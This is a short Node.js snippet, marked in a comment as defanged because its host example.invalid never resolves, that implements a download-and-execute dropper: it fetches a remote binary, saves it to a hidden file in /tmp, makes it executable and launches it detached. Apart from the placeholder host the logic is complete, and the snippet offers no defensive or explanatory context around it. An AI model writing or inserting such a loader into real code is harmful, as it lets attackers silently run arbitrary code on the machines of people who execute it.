// defanged: example.invalid never resolves
const https = require("https");
const fs = require("fs");
const { spawn } = require("child_process");
https.get("https://example.invalid/payload.bin", (res) => {
  const out = fs.createWriteStream("/tmp/.helper");
  res.pipe(out);
  out.on("finish", () => {
    fs.chmodSync("/tmp/.helper", 0o755);
    spawn("/tmp/.helper", [], { detached: true });
  });
});
